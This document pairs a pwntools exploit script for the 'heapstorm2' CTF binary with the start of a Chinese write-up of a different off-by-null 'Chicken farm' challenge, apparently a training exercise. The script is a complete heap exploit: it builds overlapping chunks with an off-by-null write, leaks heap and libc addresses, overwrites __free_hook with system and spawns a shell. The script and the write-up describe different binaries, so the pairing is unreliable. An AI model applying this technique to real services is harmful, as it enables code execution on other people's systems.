
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

def connect():
    global r, elf, libc
    r = process('./heapstorm2')
    elf = ELF("./heapstorm2")
    libc = elf.libc

is_debug = True

def debug(gdbscript=""):
    if is_debug:
        gdb.attach(r, gdbscript=gdbscript)
        pause()
    else:
        pass

def add(size):
    r.recvuntil(b"Command: ")
    r.sendline(str(1).encode())
    r.recvuntil(b"Size: ")
    r.sendline(str(size).encode())

def delete(index):
    r.recvuntil(b"Command: ")
    r.sendline(str(3).encode())
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())

def show(index):
    r.recvuntil(b"Command: ")
    r.sendline(str(4).encode())
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())

def edit(index, content):
    r.recvuntil(b"Command: ")
    r.sendline(str(2).encode())
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())
    r.recvuntil(b"Size: ")
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.send(content)

def overlapping():
    add(0x18) # 0
    add(0x508) # 1
    add(0x18) # 2 prev_size 0x510
    add(0x18) # 3
    add(0x508) # 4
    add(0x18) # 5 prev_size 0x510
    add(0x18) # 6
    #debug() # d1 ----------------------------------

    '''覆盖 idx_7'''
    edit(1, b'a'*0x4f0 + p64(0x500)) # fake_prev_size
    delete(1)
    #debug() # d2 ----------------------------------
    edit(0, b'a'*(0x18-0xC)) # 0xC for str & off-by-null 0x511->0x500
    #debug() # d3 ----------------------------------
    add(0x18) # 1
    add(0x4d8) # 7
    #debug() # d4 ----------------------------------
    delete(1)
    delete(2)
    #debug() # d5 ----------------------------------

    add(0x38) # 1
    add(0x4e8) # 2 0x4f0 + 0x40 = 0x530

    '''覆盖 idx_8'''
    edit(4, b'a'*0x4f0 + p64(0x500))
    delete(4)
    edit(3, b'a'*(0x18-0xC)) # 0xC for str & off-by-null 0x511->0x500
    add(0x18) # 4
    add(0x4d8) # 8
    delete(4)
    delete(5)

    add(0x48) # 4 0x530 - 0x50 = 0x4e0 idx_8
    #debug() # d6 ----------------------------------

    delete(2)
    #debug() # d7 ----------------------------------
    add(0x4e8) # 2
    #debug() # d8 ----------------------------------
    delete(2)
    #debug() # d9 ----------------------------------

def leak():
    global free_hook, storage, system, str_bin_sh
    storage = 0x13370800
    fake_chunk = storage - 0x20
    payload = b'\x00' * 0x10
    payload += p64(0) + p64(0x4f1)
    payload += p64(0) + p64(fake_chunk)
    edit(7, payload)
    #debug() # d10 ----------------------------------

    payload = b'\x00' * 0x20
    payload += p64(0) + p64(0x4e1)
    payload += p64(0) + p64(fake_chunk + 0x8)
    payload += p64(0) + p64(fake_chunk - 0x18 - 5)
    edit(8, payload)
    #debug() # d11 ----------------------------------

    add(0x48) # 2 0x133707e0
    #debug() # d12 ----------------------------------

    payload = p64(0)*4 + p64(0) + p64(0x13377331) + p64(storage)
    edit(2, payload)
    #debug()
    payload = p64(0)*2 + p64(0) + p64(0x13377331)
    payload += p64(storage) + p64(0x1000)
    payload += p64(fake_chunk + 3) + p64(8)
    edit(0, payload)
    #debug()

    show(1)
    r.recvuntil(b"]: ")
    heap = u64(r.recv(6).ljust(8, b'\x00'))
    success("heap:" + hex(heap))

    payload = p64(0)*2 + p64(0) + p64(0x13377331)
    payload += p64(storage) + p64(0x1000)
    payload += p64(heap + 0x10) + p64(8)
    edit(0, payload)
    #debug()

    show(1)
    r.recvuntil(b"]: ")
    malloc_hook = u64(r.recv(6).ljust(8, b'\x00')) - 0x58 - 0x10
    libc.address = malloc_hook - libc.sym['__malloc_hook']
    free_hook = libc.sym['__free_hook']
    system = libc.sym['system']
    str_bin_sh = next(libc.search(b'/bin/sh\x00'))
    success("malloc_hook:" + hex(malloc_hook))

def get_shell():
    payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000)
    payload += p64(free_hook) + p64(0x100) + p64(str_bin_sh) + p64(8)
    edit(0, payload)
    edit(1, p64(system))
    delete(2)
    r.interactive()

def pwn():
    connect()
    overlapping()
    leak()
    get_shell()

if __name__ == "__main__":
    pwn()
```

# off-by-null赛题：夕阳下的舞者

这是我学off-by-null时出的一道题。[靶场地址](https://bbs.kanxue.com/elink@edbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2H3L8$3I4S2M7X3y4@1k6W2)9J5k6h3y4G2L8b7`.`.)

## 检查文件信息

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_QBACWFZEK6HT9EE.webp)

`ELF64`位小端序程序，动态链接。

![图片描述](https://bbs.kanxue.com/upload/attach/202309/958172_QZ4S6EMHKE7DR2N.webp)

除了`FODRTIFY`保护，其余保护全开。

```bash
patchelf --replace-needed libc.so.6 ./libc-2.23.so ./562+5Liq5Yiw
patchelf --set-interpreter ./ld-2.23.so ./562+5Liq5Yiw
```

将环境修改为题目的运行环境。

## 逆向分析

```c
__int64 sub_A9D()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("\x1B[1;33m Welcome to Chicken farm!!! \x1B[0m");
  puts("1.Add a Chicken.");
  puts("2.Delete a Chicken.");
  puts("3.Cook a chicken.");
  puts("4.Chicken you are so beautiful.");
  puts("5.EXIT.");
  _isoc99_scanf("%d", &v1);
  return v1;
}
```

`sub_A9D()`函数为程序菜单。
